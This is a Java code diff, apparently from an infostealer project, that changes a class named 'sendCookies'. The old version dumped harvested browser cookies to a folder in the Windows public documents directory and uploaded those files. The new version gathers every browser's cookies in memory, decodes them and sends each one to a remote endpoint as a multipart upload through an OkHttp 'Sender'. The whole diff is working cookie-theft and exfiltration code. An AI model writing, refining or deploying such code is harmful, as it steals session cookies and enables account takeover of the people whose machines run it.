@@ -7,57 +7,32 @@ import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.RequestBody;
 
-import java.io.BufferedWriter;
-import java.io.File;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.util.Base64;
+import java.util.HashMap;
 import java.util.Map;
 
-import static io.github.luxotick.Start.documents;
-
 public class sendCookies {
-    public static void mh() throws Exception {
-        OkHttpClient client = new OkHttpClient();
-
-        File folder = new File("C:\\Users\\Public\\Documents\\Browsers\\Cookies");
-
-        for (File file : folder.listFiles()) {
-            if (file.isFile()) {
-
-                RequestBody requestBody = new MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
-                        .build();
-
-                Sender.sendFile(client, requestBody);
-            }
-        }
-    }
-    public static void zaa() {
+    public static Map<String, byte[]> zaa() throws IOException {
         Map<String, String> browserCookies = util.getAllBrowserCookies();
+        Map<String, byte[]> cookieDataMap = new HashMap<>();
 
         for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
-            String A = documents + "/Browsers/Cookies/";
-            String browserFolder = A + entry.getKey() + ".txt";
             String encodedCookieData = entry.getValue();
             byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);
 
-            // Write the cookie data to a text file
-            writeCookieToFile(browserFolder, new String(cookieData));
-        }
-    }
+            // Add the cookie data to the map
+            cookieDataMap.put(entry.getKey(), cookieData);
 
+            // Create a RequestBody from the cookie data
+            RequestBody requestBody = RequestBody.create(cookieData, MediaType.parse("text/plain"));
 
-    public static void writeCookieToFile(String fileName, String cookieData) {
-        try {
-            File file = new File(fileName);
-            file.getParentFile().mkdirs();
-            BufferedWriter writer = new BufferedWriter(new FileWriter(file));
-            writer.write(cookieData);
-            writer.close();
-        } catch (IOException e) {
-            e.printStackTrace();
+            // Send the cookie data
+            Sender.sendFile(new OkHttpClient(), new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("file", entry.getKey() + ".txt", requestBody)
+                    .build());
         }
+        return cookieDataMap;
     }
 }
